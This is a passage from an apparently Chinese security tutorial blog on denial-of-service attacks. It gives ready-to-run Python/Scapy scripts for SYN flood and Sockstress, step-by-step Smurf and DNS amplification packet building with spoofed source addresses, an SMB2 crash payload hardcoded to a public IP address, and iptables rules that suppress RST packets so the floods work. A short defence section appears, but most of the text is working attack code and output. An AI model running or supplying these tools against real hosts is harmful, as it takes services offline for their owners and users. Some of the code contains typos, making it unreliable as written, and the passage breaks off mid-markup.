class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -j DROP</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> -j DROP</span><br></pre></td></tr></table></figure><h3 id="2-脚本攻击"><a href="#2-脚本攻击" class="headerlink" title="2. 脚本攻击"></a>2. 脚本攻击</h3><h4 id="脚本攻击-linux-服务器"><a href="#脚本攻击-linux-服务器" class="headerlink" title="脚本攻击 linux 服务器"></a>脚本攻击 linux 服务器</h4><p>1.脚本内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all import*</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"用法: ./syn_flood.py [IP地址] [端口] [线程数]"</span></span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"举例: ../syn_flood.py  1.1.1.1 80 20"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">port= int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print<span class="string">"正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击。"</span></span><br><span class="line">def synflood(target,port):</span><br><span class="line">    <span class="keyword">while</span> 1:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(<span class="attribute">dst</span>=target)/TCP(dport=port,sport=x),verbose=0)</span><br><span class="line">        sr1(i/t,<span class="attribute">verbose</span>=1,timeout=2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,threads):</span><br><span class="line">    thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line">  sleep(1)</span><br></pre></td></tr></table></figure><p>2.执行脚本</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# python syn_flood.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> <span class="number">22</span> <span class="number">200</span></span><br><span class="line"># 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则</span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -j DROP</span><br></pre></td></tr></table></figure><p>抓包发现网络上充满数据包</p><p><img src="8QfyVAU.png" alt="img"></p><p>使用 ssh 连接 服务器发现无法响应</p><p><img src="8EWXAt7.png" alt="img"></p><p>在服务器使用 top 查看内存占用情况，发现占用极少</p><p><img src="wxcaUbA.png" alt="img"></p><p>在服务器查看连接，发现连接数非常多</p><p><img src="sHDzLpP.png" alt="img"></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看 linux 服务器最大 TCP 连接数发现是 <span class="number">255</span> 个</span><br><span class="line">netstat -n | awk <span class="comment">'/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;'</span></span><br></pre></td></tr></table></figure><h5 id="2-攻击windows机器"><a href="#2-攻击windows机器" class="headerlink" title="2.攻击windows机器"></a>2.攻击windows机器</h5><p>1.测试可用性</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# rdesktop <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span></span><br></pre></td></tr></table></figure><p><img src="wYUMp3w.png" alt="img"></p><p>2.执行脚本</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# python syn_flood.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> <span class="number">3389</span> <span class="number">10</span></span><br><span class="line"># 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则</span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> -j DROP</span><br><span class="line"></span><br><span class="line"><span class="symbol">root@</span>kali:~# rdesktop <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span></span><br></pre></td></tr></table></figure><p><img src="uH5y56U.png" alt="img"></p><p>winxp 的最大半开连接数只有 10 个</p><h4 id="泛洪攻击常伴随IP地址欺骗"><a href="#泛洪攻击常伴随IP地址欺骗" class="headerlink" title="泛洪攻击常伴随IP地址欺骗"></a>泛洪攻击常伴随IP地址欺骗</h4><p><img src="OIWj7fT.jpg" alt="img"></p><p>伪造源地址为 3.3.3.3，访问许多网站，将响应数据包发送给 3.3.3.3</p><ul><li>经常用于 DoS 攻击</li><li>根据 IP 头地址寻址<ul><li>伪造IP源地址</li></ul></li><li>便捷路由器过滤源IP<ul><li>入站、出站</li></ul></li><li>受害者可能是源、目的地址</li><li>绕过基于地址的验证</li><li>压力测试模拟多用户</li><li>上层协议（TCP序列号）</li></ul><h4 id="拒绝服务——Smurf攻击"><a href="#拒绝服务——Smurf攻击" class="headerlink" title="拒绝服务——Smurf攻击"></a>拒绝服务——Smurf攻击</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>向广播地址发送伪造源地址的 ICMP echo Request （ping）包</li><li>LAN 所有计算机向伪造源地址返回响应包</li><li>对现代操作系统几乎无效（不响应目标为广播的ping）</li></ul><h5 id="2-测试攻击"><a href="#2-测试攻击" class="headerlink" title="2.测试攻击"></a>2.测试攻击</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure><p><img src="G91A6l1.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.src=<span class="string">"10.10.10.132"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"10.10.10.255"</span></span><br></pre></td></tr></table></figure><p><img src="PjqvNVP.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; p=ICMP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; p.display()</span><br></pre></td></tr></table></figure><p><img src="Zr6n0yF.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=send(i/p)</span><br></pre></td></tr></table></figure><p><img src="mdv0dml.png" alt="img"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用一行发送：</span><br><span class="line">send(<span class="constructor">IP(<span class="params">dst</span>=<span class="string">"10.10.10.255"</span>,<span class="params">src</span>=<span class="string">"10.10.10.132"</span>)</span>/<span class="constructor">ICMP()</span>,count=<span class="number">100</span>,verbose=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="拒绝服务–Sockstress-攻击"><a href="#拒绝服务–Sockstress-攻击" class="headerlink" title="拒绝服务–Sockstress 攻击"></a>拒绝服务–Sockstress 攻击</h3><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>2008年由Jack C.Louis 发现</li><li>针对TCP服务的拒绝服务攻击<ul><li>消耗被攻击目标系统资源</li><li>与攻击目标建立大量socket链接</li><li>完成三次握手，最后的ACK包window 大小为0 (客户端不接收数据)</li><li>攻击者资源消耗小(CPU、内存、带宽)</li><li>异步攻击，单机可拒绝服务高配资源服务器</li><li>Window 窗口实现的TCP 流控</li></ul></li></ul><h4 id="2-脚本攻击-1"><a href="#2-脚本攻击-1" class="headerlink" title="2.脚本攻击"></a>2.脚本攻击</h4><h5 id="1-python测试脚本"><a href="#1-python测试脚本" class="headerlink" title="1.python测试脚本"></a>1.python测试脚本</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all import*</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line">import sys</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"用法: ./sockstress.py [IP地址] [端口] [线程数]"</span></span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"举例: ../sockstress.py  1.1.1.1 80 20 # 请确定被攻击端口处于开放状态"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport= int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 攻击函数</span></span><br><span class="line">def sockstress(target,dstport) :</span><br><span class="line">    <span class="keyword">while</span> 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(<span class="attribute">dst</span>=target)/TCP(sport=x,dport=dstport,flags = <span class="string">'S'</span>),<span class="attribute">timeout</span>=1,verbose=0)</span><br><span class="line">            send(IP(<span class="attribute">dst</span>=target)/TCP(dport=dstport,sport=x,window=0,lags='A',ack=(response[TCP].seq + 1) )/<span class="string">'\x00\x00'</span>,<span class="attribute">verbose</span>=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"><span class="comment">## 停止攻击函数</span></span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"正在修复 iptables 规则"</span></span><br><span class="line">    os.system(<span class="string">'iptables -D OUTPUT -p tcp --tcp-flags RST RST -d '</span>+ target +<span class="string">' -j DROP'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加iptables规则</span></span><br><span class="line">os.system(<span class="string">'iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '</span>+ target +<span class="string">' -j DROP'</span>)</span><br><span class="line">signal.signal(signal.SIGINT, shutdown)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 多线程攻击</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"\n攻击正在进行...按 Ctrl+C 停止攻击"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress, (target,dstport))</span><br><span class="line"></span><br><span class="line"><span class="comment">##永远执行</span></span><br><span class="line"><span class="keyword">while</span> 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure><ul><li><p>测试结果</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统连接数</span></span><br><span class="line">netstat |<span class="string"> grep ESTABLISHED </span>|<span class="string"> wc -l</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="zdOuFdq.png" alt="img"></p><h5 id="2-C攻击脚本"><a href="#2-C攻击脚本" class="headerlink" title="2.C攻击脚本"></a>2.C攻击脚本</h5><ul><li>下载编译</li></ul><p><a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">github 下载地址</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -c sockstress.c</span><br><span class="line">gcc -pthread -o sockstress sockstress.o</span><br><span class="line">./sockstress <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span>:<span class="number">80</span> eth0</span><br><span class="line">./sockstress <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span>:<span class="number">80</span> eth0 -p payloads/http</span><br><span class="line"></span><br><span class="line">防火墙规则</span><br><span class="line">iptables -A OUTPUT -p TCP --tcp-flags rst rst -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -j DROP</span><br></pre></td></tr></table></figure><ul><li><p>查看攻击效果</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | <span class="type">grep</span> ESTABLISHED | <span class="type">wc</span> -l</span><br><span class="line">free</span><br><span class="line"><span class="built_in">top</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-防御措施"><a href="#3-防御措施" class="headerlink" title="3.防御措施"></a>3.防御措施</h4><ul><li>直到今天sockstress攻击仍然是一种很有效的DOS攻击方式</li><li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效</li><li>根本的防御方法是采用白名单(不实际)</li><li>折中对策限制单位时间内每IP建的TCP连接数<ul><li>封杀每30秒与 80 端口建立连接超过 10 个的IP地址</li><li>iptables -I INPUT -p tcp –dport 80 -m state–state NEW -m recent–set</li><li>iptables -I INPUT-p tcp -dport 80 -m state-state NEW-m recent -update–seconds 30 -hitcount 10 j DROP</li><li>以上规则对DDOS攻击无效</li></ul></li></ul><h3 id="拒绝服务–TearDrop-攻击"><a href="#拒绝服务–TearDrop-攻击" class="headerlink" title="拒绝服务–TearDrop 攻击"></a>拒绝服务–TearDrop 攻击</h3><h4 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>主要针对早期微软操作系统（95、98、3.x、nt）<ul><li>近些年有人发现对 2.x 版本的安卓系统、6.0 IOS 系统攻击有效</li></ul></li><li>原理很有趣<ul><li>使用 IP 分段便宜实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li></ul></li><li>攻击效果<ul><li>被攻击者蓝屏、重启、卡死</li></ul></li></ul><p><img src="w9pzlfZ.png" alt="img"></p><ul><li>Ping大包，比较正常分段与teardrop攻击流量的区别</li><li>针对早期windows系统SMB协议的攻击<ul><li>teardrop_smb.py</li></ul></li><li>针对Android.IOS 系统的攻击<ul><li>teardrop_androidios.py</li></ul></li><li>攻击向量并不确定，要视具体协议分析</li></ul><h4 id="2-攻击目标"><a href="#2-攻击目标" class="headerlink" title="2.攻击目标"></a>2.攻击目标</h4><p>泪滴攻击是一种拒绝服务（DoS）攻击，涉及将碎片数据包发送到目标机器。由于接收这些数据包的机器由于TCP / IP碎片重组错误而无法重新组装，因此数据包相互重叠，导致目标网络设备崩溃。这通常发生在较早的操作系统上，例如Windows 3.1x，Windows 95，Windows NT和2.1.63之前版本的Linux内核。</p><p>IP报头中的一个字段是“片段偏移量”字段，指示包含在分段数据包中的数据相对于原始数据包中的数据的起始位置或偏移量。如果一个分片数据包的偏移量和大小之和不同于下一个分片数据包的偏移量和大小之和，则数据包重叠。发生这种情况时，易受泪滴攻击的服务器无法重新组装数据包 - 从而导致拒绝服务状况。</p><h4 id="3-攻击脚本"><a href="#3-攻击脚本" class="headerlink" title="3.攻击脚本"></a>3.攻击脚本</h4><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># When SMB2.0 recieve a "&amp;" char in the "Process Id High"</span><br><span class="line"># SMB header field it dies with a</span><br><span class="line"># PAGE_FAULT_IN_NONPAGED_AREA</span><br><span class="line"># filename: teardrop-attack-smb.py</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from socket import socket</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">#host = sys.argv[1], 445</span><br><span class="line">#host = "192.168.33.13", 445</span><br><span class="line">host = "217.113.205.53", 445</span><br><span class="line">buff = (</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>90" # Begin SMB header: Session message</span><br><span class="line">"<span class="symbol">\x</span>ff<span class="symbol">\x</span>53<span class="symbol">\x</span>4d<span class="symbol">\x</span>42" # Server Component: SMB</span><br><span class="line">"<span class="symbol">\x</span>72<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00" # Negociate Protocol</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>18<span class="symbol">\x</span>53<span class="symbol">\x</span>c8" # Operation 0x18 &amp; sub 0xc853</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>26"# Process ID High: --&gt; :) normal value should be "<span class="symbol">\x</span>00<span class="symbol">\x</span>00"</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>fe"</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>6d<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>50<span class="symbol">\x</span>43<span class="symbol">\x</span>20<span class="symbol">\x</span>4e<span class="symbol">\x</span>45<span class="symbol">\x</span>54"</span><br><span class="line">"<span class="symbol">\x</span>57<span class="symbol">\x</span>4f<span class="symbol">\x</span>52<span class="symbol">\x</span>4b<span class="symbol">\x</span>20<span class="symbol">\x</span>50<span class="symbol">\x</span>52<span class="symbol">\x</span>4f<span class="symbol">\x</span>47<span class="symbol">\x</span>52<span class="symbol">\x</span>41<span class="symbol">\x</span>4d<span class="symbol">\x</span>20<span class="symbol">\x</span>31"</span><br><span class="line">"<span class="symbol">\x</span>2e<span class="symbol">\x</span>30<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4c<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>4d<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>31<span class="symbol">\x</span>2e<span class="symbol">\x</span>30<span class="symbol">\x</span>00"</span><br><span class="line">"<span class="symbol">\x</span>02<span class="symbol">\x</span>57<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>64<span class="symbol">\x</span>6f<span class="symbol">\x</span>77<span class="symbol">\x</span>73<span class="symbol">\x</span>20<span class="symbol">\x</span>66<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>20<span class="symbol">\x</span>57"</span><br><span class="line">"<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>6b<span class="symbol">\x</span>67<span class="symbol">\x</span>72<span class="symbol">\x</span>6f<span class="symbol">\x</span>75<span class="symbol">\x</span>70<span class="symbol">\x</span>73<span class="symbol">\x</span>20<span class="symbol">\x</span>33<span class="symbol">\x</span>2e<span class="symbol">\x</span>31<span class="symbol">\x</span>61"</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4c<span class="symbol">\x</span>4d<span class="symbol">\x</span>31<span class="symbol">\x</span>2e<span class="symbol">\x</span>32<span class="symbol">\x</span>58<span class="symbol">\x</span>30<span class="symbol">\x</span>30<span class="symbol">\x</span>32<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4c"</span><br><span class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>4d<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>32<span class="symbol">\x</span>2e<span class="symbol">\x</span>31<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4e<span class="symbol">\x</span>54<span class="symbol">\x</span>20<span class="symbol">\x</span>4c"</span><br><span class="line">"<span class="symbol">\x</span>4d<span class="symbol">\x</span>20<span class="symbol">\x</span>30<span class="symbol">\x</span>2e<span class="symbol">\x</span>31<span class="symbol">\x</span>32<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>53<span class="symbol">\x</span>4d<span class="symbol">\x</span>42<span class="symbol">\x</span>20<span class="symbol">\x</span>32<span class="symbol">\x</span>2e"</span><br><span class="line">"<span class="symbol">\x</span>30<span class="symbol">\x</span>30<span class="symbol">\x</span>32<span class="symbol">\x</span>00"</span><br><span class="line">)</span><br><span class="line">s = socket()</span><br><span class="line">s.connect(host)</span><br><span class="line">s.send(buff)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h4 id="拒绝服务–DNS-放大攻击"><a href="#拒绝服务–DNS-放大攻击" class="headerlink" title="拒绝服务–DNS 放大攻击"></a>拒绝服务–DNS 放大攻击</h4><h4 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>产生大流量的攻击方法<ul><li>单机的带宽优势</li><li>巨大单机数量形成的流量汇聚</li><li>利用协议特性实现放大效果的流量</li></ul></li><li>DNS协议放大效果<ul><li>查询请求流量小，但响应流量可能非常巨大</li><li>dig ANY hp.com @202 106.0.20 (流量放大约8倍)</li></ul></li><li>攻击原理<ul><li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li><li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDOS</li></ul></li></ul><h4 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# dig any baidu.com @<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure><p>发送60字节长度，返回216字节长度</p><p><img src="GqPGP9F.png" alt="img"></p><h4 id="3-Scapy构造攻击数据包原理"><a href="#3-Scapy构造攻击数据包原理" class="headerlink" title="3.Scapy构造攻击数据包原理"></a>3.Scapy构造攻击数据包原理</h4><ul><li>IP/UDP/DNS/DNS 查询内容</li></ul><p><img src="px5Ihn0.png" alt="img"></p><ul><li>结合IP地址欺骗，利用大量 DNS 服务器做傀儡攻击目标</li></ul><h4 id="4-构造数据包过程"><a href="#4-构造数据包过程" class="headerlink" title="4.构造数据包过程"></a>4.构造数据包过程</h4><p>1.构造 IP 数据包</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure><p><img src="z1OV3Jv.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"114.114.114.114"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure><p><img src="3MXZboo.png" alt="img"></p><p>2.构造UDP数据包</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; u=UDP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; u.display()</span><br></pre></td></tr></table></figure><p><img src="14c4SzU.png" alt="img"></p><p>3.构造 DNS 数据包</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; d=DNS()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.display()</span><br></pre></td></tr></table></figure><p><img src="aZfTrYu.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.rd=<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.qdcount=<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.display()</span><br></pre></td></tr></table></figure><p><img src="aBZdHNP.png" alt="img"></p><p>4.设置查询目标</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; q=DNSQR()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; q.display()</span><br></pre></td></tr></table></figure><p><img src="qcAPHGS.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; q.qname=<span class="string">'qq.com'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; q.qtype=<span class="number">255</span>   <span class="comment">#（代表any）</span></span><br></pre></td></tr></table></figure><p><img src="DiDX3Nk.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.qd=q   <span class="comment"># 设置目标</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.display()</span><br></pre></td></tr></table></figure><p><img src="ucWhz05.png" 